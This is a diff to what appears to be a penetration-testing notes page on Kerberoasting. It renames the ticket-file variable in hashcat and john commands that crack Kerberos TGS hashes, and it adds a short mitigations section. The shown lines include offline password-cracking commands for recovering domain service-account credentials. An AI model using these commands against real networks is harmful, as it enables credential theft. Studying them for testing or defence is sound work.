@@ -195,9 +195,9 @@ python tgsrepcrack.py /PATH/TO/rockyou.txt $TGS_TICKET.kirbi
 ### .txt output crack
 
 ```bash
-hashcat -m 13100 -o creds.txt -a 0 ./$RUBEUS_OUTPUT.txt ./rockyou.txt
+hashcat -m 13100 -o creds.txt -a 0 ./$KRB5TGS.txt ./rockyou.txt
 
-john --format=krb5tgs --wordlist=.../rockyou.txt $RUBEUS_OUTPUT.txt
+john --format=krb5tgs --wordlist=.../rockyou.txt $KRB5TGS.txt
 ```
 
 
@@ -217,13 +217,20 @@ runas /netonly /User:$USER powershell.exe
 
 
 
-#### Resources:
+## Resources:
 
 {% embed url="https://www.picussecurity.com/resource/blog/kerberoasting-attack-explained-mitre-attack-t1558.003" %}
 
 
 
 
+
+## Mitigations
+
+To avoid this type of attack, we can:
+
+* Use strong Passwords
+* Least Privilege
 
 
 
